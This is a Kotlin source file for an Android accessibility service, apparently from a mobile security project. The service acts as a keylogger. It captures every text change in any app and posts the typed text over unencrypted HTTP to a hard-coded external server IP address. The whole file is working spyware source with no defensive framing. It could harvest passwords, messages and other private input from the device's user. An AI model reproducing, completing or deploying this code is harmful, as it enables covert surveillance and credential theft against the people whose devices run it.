package com.mycompany.mobilesecv2
 
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
 
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class KeyLoggerAccessibilityService : AccessibilityService() {

    private val client = OkHttpClient()
    // Using HTTP. Change to HTTPS if your server supports it.
    private val postUrl = "http://20.255.248.234:5000/log"
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    override fun onServiceConnected() {
        Log.d("KeyLogger", "Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = it.text?.joinToString(" ") ?: ""
                Log.d("KeyLogger", "Input captured: $text")
                // Send the captured keylog to the EC2 server.
                sendKeyLog(text)
            }
        }
    }

    /**
     * Sends the keylogged text to the EC2 server via an HTTP POST request.
     */
    private fun sendKeyLog(text: String) {
        // Build JSON payload.
        val jsonPayload = """{"keylog": "$text"}"""
        val requestBody = jsonPayload.toRequestBody(jsonMediaType)

        // Create the POST request.
        val request = Request.Builder()
            .url(postUrl)
            .post(requestBody)
            .build()

        // Execute the request asynchronously.
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("KeyLogger", "Failed to send keylog: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d("KeyLogger", "Keylog sent successfully: ${response.code}")
                response.close()
            }
        })
    }

    override fun onInterrupt() {}
}
